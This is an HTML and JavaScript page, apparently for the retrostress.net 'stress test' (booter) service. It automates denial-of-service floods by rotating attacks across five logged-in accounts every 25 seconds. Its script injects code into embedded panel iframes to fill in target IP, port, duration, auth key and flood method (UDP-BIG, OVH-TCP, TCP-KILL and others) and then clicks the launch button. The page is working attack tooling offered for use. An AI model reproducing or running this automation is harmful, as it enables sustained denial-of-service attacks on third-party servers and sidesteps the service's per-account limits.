<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>5-Account Stress Test Panel | retrostress.net</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #0a1a0a 100%);
            font-family: 'Courier New', monospace;
            color: #0f0;
            padding: 15px;
            min-height: 100vh;
        }
        .container { max-width: 1600px; margin: 0 auto; }
        .header {
            text-align: center;
            margin-bottom: 20px;
            padding: 15px;
            background: rgba(0,0,0,0.8);
            border-radius: 10px;
            border: 1px solid #0f0;
        }
        h1 { font-size: 1.5em; text-shadow: 0 0 10px #0f0; }
        .subtitle { color: #888; font-size: 11px; margin-top: 5px; }
        .tabs-container {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .tab-card {
            flex: 1;
            min-width: 280px;
            background: rgba(0,0,0,0.9);
            border: 1px solid #0f0;
            border-radius: 10px;
            overflow: hidden;
        }
        .tab-header {
            background: #0f0;
            color: #000;
            padding: 8px;
            font-weight: bold;
            text-align: center;
            font-size: 14px;
        }
        .tab-header.logged { background: #0a0; }
        .tab-header.waiting { background: #333; color: #0f0; }
        .iframe-container {
            height: 400px;
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        .tab-controls {
            display: flex;
            gap: 5px;
            padding: 8px;
            background: #111;
        }
        .tab-btn {
            flex: 1;
            padding: 5px;
            background: #222;
            color: #0f0;
            border: 1px solid #0f0;
            cursor: pointer;
            font-size: 11px;
        }
        .tab-btn:hover { background: #0f0; color: #000; }
        .control-panel {
            background: rgba(0,0,0,0.95);
            border: 2px solid #0f0;
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
        }
        .input-row {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 15px;
        }
        .input-row input, .input-row select {
            flex: 1;
            padding: 8px;
            background: #222;
            border: 1px solid #0f0;
            color: #0f0;
            border-radius: 5px;
            font-family: monospace;
        }
        .timer {
            font-size: 60px;
            text-align: center;
            font-weight: bold;
            font-family: monospace;
            padding: 15px;
            background: #000;
            border-radius: 10px;
            margin: 10px 0;
        }
        .btn-row {
            display: flex;
            gap: 10px;
            margin: 10px 0;
        }
        .btn {
            flex: 1;
            padding: 12px;
            font-weight: bold;
            border: none;
            cursor: pointer;
            border-radius: 5px;
            font-family: monospace;
        }
        .btn-start { background: #0f0; color: #000; }
        .btn-stop { background: #600; color: #f00; }
        .btn-setup { background: #00a; color: #0ff; }
        .status {
            padding: 10px;
            background: #111;
            border-radius: 5px;
            font-size: 11px;
            text-align: center;
        }
        .tab-status-bar {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin-top: 10px;
        }
        .tab-indicator {
            padding: 3px 10px;
            background: #222;
            border-radius: 15px;
            font-size: 10px;
        }
        .tab-indicator.active { background: #0f0; color: #000; }
        @media (max-width: 768px) {
            .tabs-container { flex-direction: column; }
            .timer { font-size: 40px; }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🎯 5-ACCOUNT STRESS TEST PANEL</h1>
        <div class="subtitle">retrostress.net | UDP-BIG L4 | 30 sec | Auto Rotate Every 25 sec</div>
    </div>
    
    <div class="tabs-container" id="tabsContainer"></div>
    
    <div class="control-panel">
        <div class="input-row">
            <input type="text" id="targetIp" placeholder="Target IP" value="127.0.0.1">
            <input type="text" id="port" placeholder="Port" value="80">
            <input type="number" id="duration" placeholder="Duration (sec)" value="30" max="30">
        </div>
        <div class="input-row">
            <input type="text" id="authKey" placeholder="🔑 Authentication Key">
            <select id="method">
                <option value="UDP-BIG">🔥 UDP-BIG L4 (Recommended)</option>
                <option value="UDP-CUSTOM">UDP-CUSTOM L4</option>
                <option value="UDP-ZERO">UDP-ZERO L4</option>
                <option value="OVH-TCP">OVH-TCP L4</option>
                <option value="CHAOS">CHAOS L4</option>
                <option value="TCP-KILL">TCP-KILL L4</option>
            </select>
        </div>
        
        <div class="timer" id="timerDisplay">00:00</div>
        
        <div class="btn-row">
            <button class="btn btn-setup" id="setupBtn">📑 STEP 1: SETUP 5 TABS</button>
            <button class="btn btn-start" id="startBtn">🚀 STEP 2: START ROTATION</button>
            <button class="btn btn-stop" id="stopBtn">⏹ STOP ROTATION</button>
        </div>
        
        <div class="status" id="statusMsg">⚡ Ready - Click "Setup 5 Tabs" first</div>
        <div class="tab-status-bar" id="tabStatusBar"></div>
    </div>
</div>

<script>
    let rotationActive = false;
    let currentTabIndex = 0;
    let timerInterval = null;
    let remainingSeconds = 25;
    let iframes = [];
    let accountsLogged = [false, false, false, false, false];
    
    const methods = ['UDP-BIG', 'UDP-CUSTOM', 'UDP-ZERO', 'OVH-TCP', 'CHAOS', 'TCP-KILL'];
    
    function createTabs() {
        const container = document.getElementById('tabsContainer');
        container.innerHTML = '';
        iframes = [];
        
        for (let i = 1; i <= 5; i++) {
            const tabDiv = document.createElement('div');
            tabDiv.className = 'tab-card';
            tabDiv.innerHTML = `
                <div class="tab-header waiting" id="tabHeader${i}">📌 ACCOUNT ${i} - Not Logged In</div>
                <div class="iframe-container">
                    <iframe id="iframe${i}" src="https://retrostress.net/panel"></iframe>
                </div>
                <div class="tab-controls">
                    <button class="tab-btn" onclick="markLogged(${i})">✅ Mark Logged In</button>
                    <button class="tab-btn" onclick="refreshTab(${i})">🔄 Refresh</button>
                    <button class="tab-btn" onclick="attackNow(${i})">⚔️ Attack Now</button>
                </div>
            `;
            container.appendChild(tabDiv);
            iframes[i] = document.getElementById(`iframe${i}`);
        }
    }
    
    function markLogged(accountNum) {
        accountsLogged[accountNum - 1] = true;
        document.getElementById(`tabHeader${accountNum}`).className = 'tab-header logged';
        document.getElementById(`tabHeader${accountNum}`).innerHTML = `✅ ACCOUNT ${accountNum} - Logged In`;
        updateStatus(`Account ${accountNum} marked as logged in`, '#0f0');
    }
    
    function refreshTab(accountNum) {
        iframes[accountNum].src = iframes[accountNum].src;
        updateStatus(`Refreshing Account ${accountNum}`, '#ff0');
    }
    
    function attackNow(accountNum) {
        const targetIp = document.getElementById('targetIp').value;
        const port = document.getElementById('port').value;
        const duration = document.getElementById('duration').value;
        const authKey = document.getElementById('authKey').value;
        const method = document.getElementById('method').value;
        
        if (!authKey) {
            updateStatus('❌ Enter authentication key first!', '#f00');
            return;
        }
        
        executeAttackInIframe(iframes[accountNum], targetIp, port, duration, authKey, method);
        updateStatus(`⚔️ Manual attack sent from Account ${accountNum}`, '#0f0');
    }
    
    function executeAttackInIframe(iframe, targetIp, port, duration, authKey, method) {
        const jsCode = `
            (function() {
                var inputs = document.querySelectorAll('input');
                for(var i=0; i<inputs.length; i++) {
                    if(inputs[i].type === 'text' && inputs[i].placeholder !== 'Target IP') {
                        inputs[i].value = '${authKey}';
                        inputs[i].dispatchEvent(new Event('input', {bubbles:true}));
                    }
                    if(inputs[i].placeholder && inputs[i].placeholder.toLowerCase().includes('target')) {
                        inputs[i].value = '${targetIp}';
                        inputs[i].dispatchEvent(new Event('input', {bubbles:true}));
                    }
                    if(inputs[i].placeholder && inputs[i].placeholder.toLowerCase().includes('port')) {
                        inputs[i].value = '${port}';
                        inputs[i].dispatchEvent(new Event('input', {bubbles:true}));
                    }
                    if(inputs[i].placeholder && inputs[i].placeholder.toLowerCase().includes('duration')) {
                        inputs[i].value = '${duration}';
                        inputs[i].dispatchEvent(new Event('input', {bubbles:true}));
                    }
                }
                var select = document.querySelector('select');
                if(select) {
                    for(var i=0; i<select.options.length; i++) {
                        if(select.options[i].text.includes('${method}')) {
                            select.selectedIndex = i;
                            select.dispatchEvent(new Event('change', {bubbles:true}));
                            break;
                        }
                    }
                }
                var btn = document.querySelector('button');
                if(btn) btn.click();
                return 'done';
            })();
        `;
        iframe.contentWindow.postMessage({type: 'execute', code: jsCode}, '*');
        try {
            iframe.contentWindow.eval(jsCode);
        } catch(e) {}
    }
    
    function setupTabs() {
        const authKey = document.getElementById('authKey').value;
        if (!authKey) {
            updateStatus('❌ Enter authentication key first!', '#f00');
            return;
        }
        updateStatus('📑 Refreshing all 5 tabs...', '#ff0');
        for (let i = 1; i <= 5; i++) {
            iframes[i].src = "https://retrostress.net/panel";
        }
        setTimeout(() => {
            updateStatus('✅ 5 tabs created! Login manually in each tab, then click "Mark Logged In"', '#0f0');
        }, 3000);
        updateTabStatusBar();
    }
    
    function startRotation() {
        const authKey = document.getElementById('authKey').value;
        if (!authKey) {
            updateStatus('❌ Enter authentication key first!', '#f00');
            return;
        }
        
        if (rotationActive) {
            updateStatus('⚠️ Rotation already running!', '#ff0');
            return;
        }
        
        rotationActive = true;
        currentTabIndex = 0;
        remainingSeconds = 25;
        updateTimerDisplay();
        attackCurrentTab();
        startTimer();
        updateStatus('🟢 Rotation started! Attacking every 25 seconds', '#0f0');
        updateTabStatusBar();
    }
    
    function startTimer() {
        if (timerInterval) clearInterval(timerInterval);
        timerInterval = setInterval(() => {
            if (!rotationActive) return;
            if (remainingSeconds > 0) {
                remainingSeconds--;
                updateTimerDisplay();
            } else {
                remainingSeconds = 25;
                updateTimerDisplay();
                currentTabIndex = (currentTabIndex + 1) % 5;
                attackCurrentTab();
                updateTabStatusBar();
            }
        }, 1000);
    }
    
    function updateTimerDisplay() {
        const timerDiv = document.getElementById('timerDisplay');
        timerDiv.innerText = `00:${String(remainingSeconds).padStart(2,'0')}`;
        if (remainingSeconds <= 5) {
            timerDiv.style.color = '#f00';
            timerDiv.style.fontSize = '70px';
        } else {
            timerDiv.style.color = '#0f0';
            timerDiv.style.fontSize = '60px';
        }
    }
    
    function attackCurrentTab() {
        const targetIp = document.getElementById('targetIp').value;
        const port = document.getElementById('port').value;
        const duration = document.getElementById('duration').value;
        const authKey = document.getElementById('authKey').value;
        const method = document.getElementById('method').value;
        
        const iframe = iframes[currentTabIndex + 1];
        if (iframe) {
            executeAttackInIframe(iframe, targetIp, port, duration, authKey, method);
            updateStatus(`🔴 ATTACKING: Account ${currentTabIndex + 1} | ${method} | ${targetIp}:${port}`, '#0f0');
            
            // Visual feedback - scroll to current tab
            const tabCards = document.querySelectorAll('.tab-card');
            if (tabCards[currentTabIndex]) {
                tabCards[currentTabIndex].scrollIntoView({ behavior: 'smooth', block: 'center' });
                tabCards[currentTabIndex].style.border = '2px solid #ff0';
                setTimeout(() => {
                    tabCards[currentTabIndex].style.border = '1px solid #0f0';
                }, 500);
            }
        }
        updateTabStatusBar();
    }
    
    function stopRotation() {
        rotationActive = false;
        if (timerInterval) clearInterval(timerInterval);
        timerInterval = null;
        remainingSeconds = 25;
        updateTimerDisplay();
        updateStatus('⏹ Rotation stopped', '#f00');
        updateTabStatusBar();
    }
    
    function updateStatus(msg, color) {
        const statusDiv = document.getElementById('statusMsg');
        statusDiv.innerHTML = msg;
        statusDiv.style.color = color || '#0f0';
    }
    
    function updateTabStatusBar() {
        const bar = document.getElementById('tabStatusBar');
        bar.innerHTML = '';
        for (let i = 1; i <= 5; i++) {
            const span = document.createElement('span');
            span.className = 'tab-indicator';
            if (i - 1 === currentTabIndex && rotationActive) {
                span.className += ' active';
                span.innerHTML = `🔴 Acc ${i}`;
            } else if (accountsLogged[i-1]) {
                span.innerHTML = `✅ Acc ${i}`;
            } else {
                span.innerHTML = `⬜ Acc ${i}`;
            }
            bar.appendChild(span);
        }
    }
    
    // Initialize
    createTabs();
    document.getElementById('setupBtn').onclick = setupTabs;
    document.getElementById('startBtn').onclick = startRotation;
    document.getElementById('stopBtn').onclick = stopRotation;
    
    // Auto-save settings
    function saveSettings() {
        localStorage.setItem('targetIp', document.getElementById('targetIp').value);
        localStorage.setItem('port', document.getElementById('port').value);
        localStorage.setItem('duration', document.getElementById('duration').value);
        localStorage.setItem('authKey', document.getElementById('authKey').value);
        localStorage.setItem('method', document.getElementById('method').value);
    }
    
    function loadSettings() {
        if (localStorage.getItem('targetIp')) document.getElementById('targetIp').value = localStorage.getItem('targetIp');
        if (localStorage.getItem('port')) document.getElementById('port').value = localStorage.getItem('port');
        if (localStorage.getItem('duration')) document.getElementById('duration').value = localStorage.getItem('duration');
        if (localStorage.getItem('authKey')) document.getElementById('authKey').value = localStorage.getItem('authKey');
        if (localStorage.getItem('method')) document.getElementById('method').value = localStorage.getItem('method');
    }
    
    loadSettings();
    setInterval(saveSettings, 5000);
    setInterval(updateTabStatusBar, 2000);
    
    updateStatus('⚡ Panel ready! Click "Setup 5 Tabs" to begin', '#0f0');
</script>
</body>
</html>
